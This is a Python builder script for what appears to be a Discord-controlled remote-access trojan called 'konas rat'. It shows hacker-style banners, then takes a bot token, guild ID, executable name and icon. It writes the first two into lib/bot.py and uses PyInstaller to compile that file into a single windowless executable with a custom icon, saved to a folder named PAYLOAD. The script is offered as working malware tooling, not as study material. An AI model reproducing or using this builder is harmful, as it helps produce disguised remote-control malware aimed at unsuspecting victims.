import os
import shutil
import re
import time

def loading():
    for _ in range(3):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⢖⣶⣶⠶⣤⣤⣤⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡟⠻⠛⠉⠛⠛⠙⠝⠋⠙⢿⣍⣯⣿⡷⣶⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⠿⡽⣥⢏⡏⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠼⠃⠀⢹⣧⠀⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡠⠫⢶⠀⠀⠀⢻⡧⠰⠉⣷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⢿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠎⠁⠀⠀⠀⠀⣀⣸⣏⠀⠀⢹⢷⠄⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠒⢄⠀⢀⠞⠁⠀⠈⣿⣿⣿⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠎⠀⠀⠈⠀⣠⣾⠟⠛⠛⠉⠑⢮⡁⡿⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣾⣷⣧⣄⡀⠀⠀⢹⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⢀⠆⢀⠀⢀⡴⠋⠀⣠⡄⢠⡀⠀⠀⠙⡇⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⢿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⡸⠀⡸⠀⡼⠀⠀⠀⣻⡏⠀⣾⡇⠀⢀⠇⠀⢤⣶⣤⡈⢦⡀⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠈⣿⣿⣿⣿⣇⠀
⠀⠀⢰⣇⢠⠇⠀⡇⠀⠀⠀⡿⡧⡽⡟⡆⢠⠞⠀⣼⣿⣿⣿⣿⡄⠹⣄⣈⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⣿⣿⣿⣿⣿⠀
⠀⠀⣼⣿⠏⠀⢠⣇⣀⠀⣘⣤⢤⣧⣴⠖⠋⠀⢀⣿⣿⣿⣿⣿⣿⠀⣿⡏⢀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿
⠀ ⢿⣿⠀⠀⠖⣛⣹⠛⠛⠛⠋⠀  ⢀⡢⠀⢸⣿⣿⣿⣿⣿⣿⣷⠘⣇⠀⠁⠠⠤⢅⡀⠉⣉⣛⣋⡉⢀⣿⣿⣿⣿⣿
⠀ ⢿⡏ ⠀⠀⠈⠀⠀⠀⠀⠐⠒⠋⠉⠀⠀⠀⠀⢿⡿⠻⣿⣿⣿⠇⡈⣄⠀⠀    ⠀⠀⠈⠑⠾⠿⣿⣿⣿⣿⡟⣿⣿
⠀  ⣿⠃  ⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠚⠁⠀⡈⠛⡅⠀⡇⢸⣟⠂⠀⠀⠀⠀⠀⠀⠀⠋⠛⢋⣼⣿⣿⣿
⠀ ⡼⠃⠀⠀⠀⠀⠀⠔⠁⠀⠀⠀  ⠀⠐⡏⠀⠀⠀⠀⡇⠀⠀⣧⠀⢢⠀⢱⠸⣿⣯⣠⠀⠀⠀ ⠀⠀⣀⣴⣠⣺⣿⣿⣿⠀
⢠⠃⢀⣀⠤⠐⢉⣩⣉⠁⠀⠀⠀⠀⡜⢀⣄⣀⠦⡘⠛⢂⠜⠛⢧⠞⠳⢘⡀⢹⣿⣷⠀⠀⢀⡀⣊⡁⠈⠙⣿⣿⣿⣿⣿⠀
⣸⠐⢁⣴⢶⣶⣿⣿⣿⣿⣄⠉⢆⠀⣑⡜⠉⣟⣀⣤⣀⣤⠦⠤⢼⣅⣨⢸⢸⣿⣿⣿⣇⣠⣤⣿⣥⣾⣷⣶⣌⠉⠙⢻⠀
⠙⠷⣾⠣⣿⣿⡿⢿⣿⢻⣿⣷⡜⠀⡛⢿⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠑⠙⣶⠙⣿⣿⣏⣿⠟⣿⣿⣿⣿⣿⣧⠀⢸⡇⠀
⠀⠀⠀⢳⣿⣿⡆⠘⣿⢨⣿⣿⡗⢰⠿⠶⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⢉⣹⣿⣿⡿⢰⣿⡇⣼⣿⣿⡿⠀⢴⠅⠀
⠀⠀⠀⠀⢳⡀⠀⠘⣿⠘⣿⣿⣿⠸⡀⣠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠖⢊⡝⡿⠃⢸⣿⠀⣿⣿⣿⣷⡆⡇⠀⠀
⠀⠀⠀⠀⠈⣧⠀⢸⣿⠀⣿⣷⢻⣻⣾⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠚⠋⠁⠀⣿⡇⢠⣿⣿⣿⡿⠀⣇⠀⠀
⠀⠀⠀⠀⠀⣸⠀⢨⣿⡇⣽⣿⠟⣷⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⢸⣿⣿⣿⠇⢀⡎⠀⠀
⠀⠀⠀⠀⡀⢸⠀⠀⣿⡏⣿⡿⠷⠻⣽⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⣾⣿⣿⠟⠀⣿⠀⠀⠀
⠀⠀⠀⠀⢼⣼⡆⢀⡙⢷⣿⣷⡞⣾⣻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡏⠐⣿⡟⠁⠀⣼⡿⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡇⠀⠘⢾⣿⣯⠗⢿⣻⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠃⠀⣿⣷⣾⣿⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠈⣏⠂⠀⠀⠹⢷⣿⠿⣿⣧⡤⢶⢲⣦⣤⠤⢤⡠⢄⣀⣀⣤⢤⡦⡴⡆⠀⣿⡃⠄⢀⣻⣿⣿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⣖⠀⠀⠀⢀⠉⡀⢈⠀⢻⡉⢹⠁⡷⠀⠸⠀⠘⡀⢻⡄⢸⣇⣿⡅⢀⣿⠋⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣦⣆⠀⠀⠈⠐⠄⠘⠉⠉⢻⠞⠒⣾⠲⡴⠒⠾⠓⢺⠙⠉⡿⣿⣶⣾⡿⠂⠀⠐⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⢆⠀⠀⠀⠀⡀⠀⠀⠘⠀⠀⠈⠀⠇⠀⢘⠀⠚⠀⠀⠇⢻⣿⣿⡧⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⡄⠀⠀⠁⠐⠶⠆⠐⠀⠀⠀⠒⣀⣠⣆⣀⠀⢤⣠⣾⡿⠉⠀⠀⣀⣠⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⢆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠙⢿⣿⣿⡿⠿⡿⣯⣶⠆⢠⠌⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠓⠛⠒⠒⠖⠛⠛⠛⠛⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            """)
        time.sleep(0.5)
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.5)

def KONAS():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
 __                                                   __   
|  | ______   ____ _____    ______     ____________ _/  |_ 
|  |/ /  _ \ /    \\__  \  /  ___/     \_  __ \__  \\   __\
|    <  <_> )   |  \/ __ \_\___ \       |  | \// __ \|  |  
|__|_ \____/|___|  (____  /____  >      |__|  (____  /__|  
     \/          \/     \/     \/                  \/      
                                                     
[*] The world is a dangerous place not because of those who do evil but because of those who look on and do nothing

[+] Version | v1.0
[+] Author  | konas
[*] Github  | https://github.com/JhonnasCh
[*] Discord | https://discord.gg/xxvvxvz

""")

def set(token, uid):
    with open("lib/bot.py", "r") as f:
        src = f.read()

    src = re.sub(r'token\s*=\s*".*"', f'token = "{token}"', src)

    try:
        uids = int(uid.strip())
    except:
        pass

    src = re.sub(r'id\s*=\s*\d+', f'id = {uids}', src)

    with open("lib/bot.py", "w") as f:
        f.write(src)

def build(exe, icon):
    if not os.path.exists("PAYLOAD"):
        os.makedirs("PAYLOAD")

    option = f'--icon {icon}' if icon.strip() else ''
    os.system(f'pyinstaller --onefile --clean --name {exe} {option} --noconsole --distpath PAYLOAD lib/bot.py')

    if os.path.exists("build"):
        shutil.rmtree("build")

    if os.path.exists(f"{exe}.spec"):
        os.remove(f"{exe}.spec")

    print("\n[+] saved as PAYLOAD")

if __name__ == "__main__":
    user = os.getlogin()
    loading()
    KONAS()

    token = input("""
┌──(root@KONAS)-[~]
└─# Enter the bot token
                 
┌──(root@KONAS)-[~]
└─# """)
    uid = input("""
┌──(root@KONAS)-[~]
└─# Enter the guild ID
                 
┌──(root@KONAS)-[~]
└─# """)

    exe = input("""
┌──(root@KONAS)-[~]
└─# Enter the exe file name
                 
┌──(root@KONAS)-[~]
└─# """)
    icon = input("""
┌──(root@KONAS)-[~]
└─# Enter the image .icon file path or Enter
                 
┌──(root@KONAS)-[~]
└─# """)

    set(token, uid)
    build(exe, icon)